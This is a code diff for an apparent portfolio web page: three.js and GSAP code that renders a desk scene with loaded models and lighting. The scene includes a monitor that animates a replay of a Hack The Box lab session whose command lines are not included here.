+mouse3d.scale.set(1,.52,1.5); mouse3d.position.set(2.9,-2.18,6.4);
+mouse3d.castShadow=true; room.add(mouse3d);
+
+/* ---------- real models (CC0, Poly Haven) ---------- */
+/* Real load progress, not a fake timer. The manager reports every file. */
+const manager = new THREE.LoadingManager();
+const bootEl  = document.getElementById('boot');
+const bFill   = document.getElementById('bfill');
+const bPct    = document.getElementById('bpct');
+const bFile   = document.getElementById('bfile');
+const bStage  = document.getElementById('bstage');
+
+manager.onProgress = (url, loaded, total) => {
+  const pct = total ? loaded / total : 0;
+  bFill.style.transform = `scaleX(${pct})`;
+  bPct.textContent = Math.round(pct * 100) + '%';
+  bFile.textContent = url.split('/').pop();
+};
+
+const loader = new GLTFLoader(manager);
+// the optimised models are Draco-compressed, so the decoder has to be wired in
+const draco = new DRACOLoader();
+draco.setDecoderPath('/draco/');
+loader.setDRACOLoader(draco);
+
+// drop a loaded model on the desk. `size` targets the LARGEST dimension,
+// normalising by height alone is meaningless for a flat object like a gamepad.
+function place(obj, {x, z, y = -2.35, size, rotY = 0, shadow = true}){
+  const b = new THREE.Box3().setFromObject(obj);
+  const s = new THREE.Vector3(); b.getSize(s);
+  obj.scale.setScalar(size / Math.max(s.x, s.y, s.z));
+  const b2 = new THREE.Box3().setFromObject(obj);
+  obj.position.set(x, y - b2.min.y, z);          // sit it exactly on the surface
+  obj.rotation.y = rotY;
+  if (shadow) obj.traverse(o => { if (o.isMesh){ o.castShadow = true; o.receiveShadow = true; } });
+  room.add(obj);
+  return obj;
+}
+
+
+
+
+// ---- Mikeb's own objects, generated from his desk ----
+loader.load('/models/keyboard.glb', g =>
+  place(g.scene, {x:-.2, z:5.2, size:6.2, rotY:.02}));
+
+loader.load('/models/headset.glb', g => {
+  const h = place(g.scene, {x:-5.6, z:5.6, size:2.6, rotY:.55});
+  // the real BlackShark V2 Pro is matte black, so untextured is already right,
+  // it just needs to behave like soft plastic rather than generic grey
+  h.traverse(o => { if (o.isMesh && !o.material?.map)
+    o.material = new THREE.MeshStandardMaterial({color:0x0d0c10, roughness:.88, metalness:.06}); });
+});
+
+loader.load('/models/redbull.glb', g =>
+  place(g.scene, {x:3.3, z:5.4, size:2.1, rotY:.5}));
+
+loader.load('/models/hunter.glb', g =>
+  place(g.scene, {x:-4.3, z:4.0, size:3.4, rotY:.62}));
+
+loader.load('/models/vyke.glb', g =>
+  place(g.scene, {x:5.2, z:3.6, size:3.0, rotY:-.6}));
+
+
+
+// cable runs from the monitor down the back of the desk
+function cable(pts, r=.045){
+  const curve = new THREE.CatmullRomCurve3(pts.map(p=>new THREE.Vector3(...p)));
+  const m = new THREE.Mesh(new THREE.TubeGeometry(curve,32,r,7,false), rubberMat);
+  room.add(m);
+}
+cable([[0,-2.3,-.3],[.4,-2.5,-1.6],[1.4,-2.55,-3.2],[2.6,-2.6,-4.6]]);
+cable([[-.3,-2.3,-.4],[-1.2,-2.52,-2.0],[-2.6,-2.58,-3.4]]);
+
+
+/* ===================== LIGHT ===================== */
+const screenLight = new THREE.RectAreaLight(0x9fb6c9, 5.5, SCR_W, SCR_H);
+screenLight.position.set(0,.75,.35); screenLight.lookAt(0,.4,8); room.add(screenLight);
+
+const spill = new THREE.PointLight(0x8fa6bb, 5.5, 22, 2.4);
+spill.position.set(0,1.1,1.4); spill.castShadow = true;
+spill.shadow.mapSize.set(1024,1024); spill.shadow.bias = -0.004;
+room.add(spill);
+
+const rim = new THREE.DirectionalLight(0x35406b, .55);
+rim.position.set(-12,7,-6); room.add(rim);
+scene.add(new THREE.AmbientLight(0x181c24, .7));
+
+// a low fill from the viewer's side, so the desk props aren't pure silhouette
+const front = new THREE.DirectionalLight(0xa9b8c8, .55);
+front.position.set(2,5,16); room.add(front);
+
+// keyboard backlight: a practical, and it throws light up onto whatever sits near it
+const kbGlow = new THREE.Mesh(new THREE.PlaneGeometry(5.4,1.7),
+  new THREE.MeshBasicMaterial({color:0xc11f1f, transparent:true, opacity:.30}));
+kbGlow.rotation.x=-Math.PI/2; kbGlow.position.set(-.2,-2.32,5.0); room.add(kbGlow);
+const kbLight = new THREE.PointLight(0xd4492f, 2.6, 8, 2.2);
+kbLight.position.set(-.2,-1.85,5.0); room.add(kbLight);
+
+/* panel halo: this is the glow, and it never touches the text */
+function glowTex(){
+  const c=document.createElement('canvas');c.width=c.height=128;
+  const g=c.getContext('2d');const r=g.createRadialGradient(64,64,0,64,64,64);
+  r.addColorStop(0,'rgba(255,255,255,.55)');r.addColorStop(.32,'rgba(160,190,215,.24)');
+  r.addColorStop(1,'rgba(120,150,180,0)');
+  g.fillStyle=r;g.fillRect(0,0,128,128);return new THREE.CanvasTexture(c);
+}
+const halo = new THREE.Sprite(new THREE.SpriteMaterial({
+  map:glowTex(), transparent:true, opacity:.55,
+  blending:THREE.AdditiveBlending, depthWrite:false, fog:false}));
+halo.position.set(0,.75,-.6); halo.scale.set(22,15,1); room.add(halo);
+
+/* dust */
+const DUST = 300;
+const dGeo = new THREE.BufferGeometry();
+const dPos = new Float32Array(DUST*3);
+for(let i=0;i<DUST;i++){
+  dPos[i*3]=(Math.random()-.5)*26; dPos[i*3+1]=(Math.random()-.5)*14;
+  dPos[i*3+2]=(Math.random()-.5)*14+2;
+}
+dGeo.setAttribute('position', new THREE.BufferAttribute(dPos,3));
+const dust = new THREE.Points(dGeo, new THREE.PointsMaterial({
+  color:0xa8b6c4, size:.032, transparent:true, opacity:.42,
+  blending:THREE.AdditiveBlending, depthWrite:false, fog:true}));
+room.add(dust);
+
+/* ===================== SCREEN DRAWING ===================== */
+const PAD = 40, LINE = 37, FONT = '25px "Cascadia Code", Consolas, monospace';
+const TOPBAR = 64;
+const MAXLINES = Math.floor((CH - PAD - TOPBAR - 30) / LINE);
+
+let shown = [];
+let heat = 0, flash = 0, powered = 0, caretOnly = false;
+let statusWho='john.w @ DC01.darkzero.htb', statusPriv='domain user', statusLvl=0;
+
+function drawScreen(){
+  const bg = ctx.createLinearGradient(0,0,0,CH);
+  bg.addColorStop(0, `rgb(${7+heat*13},${8+heat*3},${11+heat*3})`);
+  bg.addColorStop(1, `rgb(${4+heat*8},${4+heat*2},${6+heat*2})`);
+  ctx.fillStyle = bg; ctx.fillRect(0,0,CW,CH);
+
+  if (powered > .96){
+    ctx.fillStyle = 'rgba(255,255,255,.03)'; ctx.fillRect(0,0,CW,TOPBAR);
+    ctx.fillStyle = 'rgba(255,255,255,.06)'; ctx.fillRect(0,TOPBAR-1,CW,1);
+
+    ctx.font = '20px "Cascadia Code", Consolas, monospace';
+    ctx.textBaseline='middle'; ctx.fillStyle='#a8a49d';
+    ctx.fillText(statusWho, PAD, TOPBAR/2);
+    const whoW = ctx.measureText(statusWho).width;
+
+    const priv = statusPriv.toUpperCase();
+    ctx.font = '13px "Cascadia Code", Consolas, monospace';
+    const pw = ctx.measureText(priv).width, bx = PAD+whoW+30;
+    ctx.strokeStyle = PRIV_COL[statusLvl]; ctx.lineWidth=1;
+    ctx.strokeRect(bx, TOPBAR/2-13, pw+22, 26);
+    ctx.fillStyle = PRIV_COL[statusLvl];
+    ctx.fillText(priv, bx+11, TOPBAR/2);
+
+    ctx.font = FONT; ctx.textBaseline='top';
+    const start = Math.max(0, shown.length-MAXLINES);
+    const visible = Math.max(1, shown.length-start);
+    for(let i=start;i<shown.length;i++){
+      const l = shown[i], y = TOPBAR+22+(i-start)*LINE;
+      const age = (i-start)/Math.max(1,visible-1);
+      ctx.globalAlpha = 0.36 + 0.64*Math.pow(age,.85);
+      ctx.fillStyle = COL[l.c] || COL.out;
+      const txt = l.t.slice(0,l.chars);
+      ctx.fillText(txt, PAD, y);
+      if (l.redacted && l.chars >= l.t.length){
+        const w = ctx.measureText(l.t).width;
+        ctx.font='12px "Cascadia Code", Consolas, monospace'; ctx.fillStyle='#67625b';
+        ctx.fillText('redacted · HTB flags are not published', PAD+w+18, y+3);
+        ctx.font=FONT;
+      }
+      if (i===shown.length-1 && l.chars<l.t.length){
+        const w=ctx.measureText(txt).width;
+        ctx.fillStyle='#d4492f'; ctx.fillRect(PAD+w+2,y+2,9,18);
+      }
+      ctx.globalAlpha = 1;
+    }
+    if (caretOnly && (performance.now()/520|0)%2===0){
+      ctx.fillStyle='#d4492f'; ctx.fillRect(PAD,TOPBAR+24,9,18);
+    }
+  }
+
+  if (powered < 1){
+    const h = Math.max(2, CH*powered);
+    ctx.fillStyle='#000';
+    ctx.fillRect(0,0,CW,(CH-h)/2); ctx.fillRect(0,(CH+h)/2,CW,(CH-h)/2);
+  }
+  if (flash > 0){
+    ctx.fillStyle=`rgba(255,${150+80*(1-flash)},90,${flash*.42})`;
+    ctx.fillRect(0,0,CW,CH);
+  }
+  ctx.fillStyle='rgba(0,0,0,.13)';
+  for(let y=0;y<CH;y+=3) ctx.fillRect(0,y,CW,1);
+
+  screenTex.needsUpdate = true;
+}
+
+/* ===================== REPLAY ===================== */
+const lblEl = document.getElementById('stagelbl');
+const lblS = lblEl.querySelector('.s'), lblW = lblEl.querySelector('.w');
+const reduced = matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+const COOL = new THREE.Color(0x9fb6c9), WARM = new THREE.Color(0xff5a32);
+function setHeat(h){
+  heat = h;
+  const c = COOL.clone().lerp(WARM,h);
+  screenLight.color.copy(c); spill.color.copy(COOL.clone().lerp(WARM, h*0.62));
+  screenLight.intensity = 5.5 + h*4;
+  spill.intensity = 5.5 + h*4.5;
+  halo.material.color.copy(c);
+  halo.material.opacity = .55 + h*.3;
+  led.material.color.copy(c);
+  dust.material.color.copy(c.clone().lerp(new THREE.Color(0xffffff),.35));
+}
+setHeat(0);
+
+const wait = s => new Promise(r=>gsap.delayedCall(s,r));
+function pushIn(a){
+  gsap.to(camera.position,{z:CAM_HOME.z-a*3.0, y:CAM_HOME.y+a*.2,
+    duration:2.4, ease:'power2.inOut', overwrite:'auto', onUpdate:()=>camera.lookAt(LOOK)});
+}
+function cameraHome(d){
+  gsap.to(camera.position,{x:CAM_HOME.x,y:CAM_HOME.y,z:CAM_HOME.z,
+    duration:d, ease:'power2.inOut', overwrite:'auto', onUpdate:()=>camera.lookAt(LOOK)});
+}
+
+function typeLine(src, idx){
+  return new Promise(res=>{
+    const e = {t:src.t, c:src.c, chars:0, redacted:src.redacted};
+    shown.push(e);
+    if (shown.length > MAXLINES+8) shown.shift();
+    if (src.stage){
+      lblS.textContent=src.stage[0]; lblW.textContent=src.stage[1];
+      gsap.fromTo(lblEl,{opacity:0,x:14},{opacity:1,x:0,duration:.3,ease:'power4.out'});
+    }
+    if (src.ctx){ statusWho=src.ctx[0]; statusPriv=src.ctx[1]; statusLvl=src.ctx[2]; }
+    if (src.push) pushIn(src.push);
+    setHeat(Math.min(1, idx/(SCRIPT.length-2)));
+    if (src.c==='cmd'){
+      gsap.to(e,{chars:src.t.length, duration:Math.min(1.4,src.t.length*.015),
+        ease:'none', onComplete:()=>gsap.delayedCall(.18,res)});
+    } else {
+      e.chars = src.t.length;
+      gsap.delayedCall((src.c==='hot'||src.c==='good')?.6:.24, res);
+    }
+  });
+}
+
+async function runReplay(){
+  for(;;){
+    shown=[]; setHeat(0); flash=0;
+    statusWho='john.w @ DC01.darkzero.htb'; statusPriv='domain user'; statusLvl=0;
+    gsap.set(lblEl,{opacity:0});
+    powered=0; caretOnly=false;
+    camera.position.copy(CAM_HOME); camera.lookAt(LOOK);
+    await wait(.5);
+    await new Promise(r=>{const o={v:0};gsap.to(o,{v:1,duration:.5,ease:'power3.out',
+      onUpdate:()=>{powered=o.v;}, onComplete:r});});
+    caretOnly=true; await wait(1.5); caretOnly=false;
+
+    for(let i=0;i<SCRIPT.length;i++){
+      const s = SCRIPT[i];
+      await typeLine(s,i);
+      if (s.wait) await wait(s.wait);
+      if (s.c==='root'){ const o={v:1};
+        gsap.to(o,{v:0,duration:2.4,ease:'power2.out',onUpdate:()=>{flash=o.v;}}); }
+    }
+    await wait(3.6);
+    cameraHome(2.6);
+    gsap.to(lblEl,{opacity:0,duration:.7});
+    await new Promise(r=>{const o={v:1};gsap.to(o,{v:0,duration:.55,ease:'power3.in',
+      onUpdate:()=>{powered=o.v;}, onComplete:r});});
+    await wait(1.1);
+  }
+}
+
+/* ===================== RENDER ===================== */
+function resize(){
+  renderer.setSize(innerWidth,innerHeight,false);
+  camera.aspect = innerWidth/innerHeight; camera.updateProjectionMatrix();
+}
+addEventListener('resize',resize); resize();
+
+// don't burn GPU on a scene nobody can see
+let heroVisible = true;
+new IntersectionObserver(
+  ([e]) => { heroVisible = e.isIntersecting; },
+  {threshold: 0}
+).observe(document.querySelector('.hero'));
+
+const clock = new THREE.Timer();
+(function tick(){
+  requestAnimationFrame(tick);
+  clock.update();
+  const dt=clock.getDelta(), t=clock.getElapsed();
+  room.rotation.y = Math.sin(t*.05)*.010;
+  room.rotation.x = Math.cos(t*.04)*.006;
+  const dp = dGeo.attributes.position.array;
+  for(let i=0;i<DUST;i++){
+    dp[i*3+1] += dt*.085*(0.4+(i%7)/7);
+    dp[i*3]   += Math.sin(t*.2+i)*dt*.028;
+    if (dp[i*3+1] > 7.5) dp[i*3+1] = -7.5;
+  }
+  dGeo.attributes.position.needsUpdate = true;
+  if (heroVisible){ drawScreen(); renderer.render(scene,camera); }
+})();
+
+const intro = gsap.timeline({delay:.15});
+intro.to('#kicker',{opacity:1,duration:.3},0);
+gsap.utils.toArray('.strike .i').forEach((ln,i)=>{
+  intro.to(ln,{y:'0%',duration:.2,ease:'power4.out'}, .14+i*.17)
+       .fromTo(ln,{x:-8},{x:0,duration:.16,ease:'power3.out'}, .14+i*.17+.13);
+});
+intro.to('#slash',{scaleX:1,duration:.26,ease:'power4.inOut'},.5)
+     .to('#whoami',{opacity:1,duration:.5},.66);
+
+/* Hold the replay until the desk actually exists, otherwise the chain is
+   already half-typed by the time anything is on screen. */
+let started = false;
+function begin(){
+  if (started) return;
+  started = true;
+  bStage.textContent = 'Ready';
+  bFill.style.transform = 'scaleX(1)';
+  bPct.textContent = '100%';
+  gsap.to(bootEl, {opacity:0, duration:.55, ease:'power2.inOut',
+    onComplete: () => {
+      bootEl.remove();
+      // ScrollTrigger measured the page while the boot screen was still in the
+      // layout, so every trigger point below the fold was wrong until now
+      ScrollTrigger.refresh();
+    }});
+
+  if (!reduced) runReplay();
+  else {
+    powered = 1;
+    SCRIPT.forEach(s => shown.push({t:s.t, c:s.c, chars:s.t.length, redacted:s.redacted}));
+    statusWho='administrator @ DARKZERO.HTB'; statusPriv='domain admin'; statusLvl=3;
+    setHeat(1);
+  }
+}
+
+
+/* ===================== ACT II + III ===================== */
+const lead = document.querySelector('.case.lead');
+
+gsap.timeline({scrollTrigger:{trigger:'#chapter',start:'top 74%'}})
+  .from('.chapter-head',{opacity:0,y:30,duration:.34,ease:'power4.out'})
+  .to('.fact',{opacity:1,y:0,duration:.3,ease:'power4.out',stagger:.08},'-=.12');
+
+gsap.timeline({scrollTrigger:{trigger:'.twoup',start:'top 76%'}})
+  .to('.code .cl',{opacity:1,duration:.06,ease:'none',stagger:.085})
+  .to('#progfill',{scaleX:.355,duration:.9,ease:'power3.inOut'},'-=.5');
+
+gsap.utils.toArray('[data-count]').forEach(el=>{
+  const end = +el.getAttribute('data-count'), o = {v:0};
+  gsap.to(o,{v:end,duration:1.3,ease:'power2.out',
+    scrollTrigger:{trigger:'.twoup',start:'top 76%'},
+    onUpdate:()=> el.textContent = Math.round(o.v)});
+});
+
+gsap.timeline({scrollTrigger:{trigger:'#roadmap',start:'top 80%'}})
+  .to('.step',{opacity:1,duration:.3,ease:'power4.out',stagger:.14})
+  .to('#trackfill',{scaleX:1,duration:.7,ease:'power3.inOut'},'-=.5');
+
+gsap.timeline({scrollTrigger:{trigger:'.case-grid',start:'top 78%'}})
+  .to(lead.querySelector('.wipe'),{scaleX:1,duration:.5,ease:'power4.inOut'})
+  .to(lead,{opacity:1,y:0,duration:.36,ease:'power4.out'},'-=.3')
+  .add(()=>lead.classList.add('lit'))
+  .to('.case-sub-grid .wipe',{scaleX:1,duration:.42,ease:'power4.inOut',stagger:.1},'-=.12')
+  .to('.case-sub-grid .case',{opacity:1,y:0,duration:.32,ease:'power4.out',stagger:.1},'-=.46');
+
+
+
+
+
+
+
+/* nav only earns a background once the hero is behind you */
+const navEl = document.getElementById('nav');
+const onNav = () => navEl.classList.toggle('stuck', window.scrollY > innerHeight * .72);
+onNav(); addEventListener('scroll', onNav, {passive:true});
+
+gsap.timeline({scrollTrigger:{trigger:'.foot',start:'top 85%'}})
+  .from('.foot-k',{opacity:0,y:12,duration:.3,ease:'power4.out'})
+  .from('.foot-mail',{opacity:0,y:20,duration:.36,ease:'power4.out'},'-=.14')
+  .from('.foot-note',{opacity:0,duration:.5},'-=.2')
+  .from('.foot-links a,.foot-flat',{opacity:0,x:16,duration:.28,ease:'power4.out',stagger:.06},'-=.34')
+  .from('.foot-base',{opacity:0,duration:.4},'-=.1')
+  .from('.foot-mark',{opacity:0,y:34,duration:.8,ease:'power3.out'},'-=.25')
+  .from('.totop',{opacity:0,scale:.8,duration:.4,ease:'back.out(2)'},'-=.8');
+
+manager.onLoad = () => gsap.delayedCall(.25, begin);
+manager.onError = url => { console.warn('failed to load', url); };
+// never let a stalled or missing asset trap the visitor on the boot screen
+gsap.delayedCall(20, begin);
 </script>
